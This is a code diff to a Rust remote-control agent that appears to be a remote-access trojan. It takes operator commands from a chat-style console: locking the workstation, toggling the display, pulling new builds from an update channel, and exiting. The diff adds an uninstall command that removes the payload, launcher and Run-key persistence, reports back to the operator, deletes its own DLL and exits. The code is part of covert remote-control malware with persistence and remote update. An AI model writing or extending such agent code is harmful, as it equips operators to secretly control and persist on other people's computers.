@@ -32,6 +32,7 @@ const HELP: &str = "\
 !monitor on|off            display power
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
+!uninstall                 remove payload + launcher + Run key, then stop
 !exit                      terminate agent";
 
 fn stamp() -> String {
@@ -205,6 +206,28 @@ pub async fn dispatch(
                 Ok(None) => st.send(console, "already on the newest build").await?,
                 Err(e) => st.send(console, &format!("update failed: {e:#}")).await?,
             }
+        }
+        "uninstall" | "cleanup" | "remove" => {
+            let (run_status, removed, dll) = host::purge_install();
+            let list = if removed.is_empty() {
+                "(none)".to_string()
+            } else {
+                removed
+                    .iter()
+                    .map(|p| p.display().to_string())
+                    .collect::<Vec<_>>()
+                    .join(", ")
+            };
+            st.send(
+                console,
+                &format!(
+                    "uninstall: run key {run_status}; removed {list}; deleting {} on exit",
+                    dll.display()
+                ),
+            )
+            .await?;
+            host::schedule_self_cleanup(&dll);
+            std::process::exit(0);
         }
         "exit" | "quit" => {
             st.send(console, "bye").await.ok();
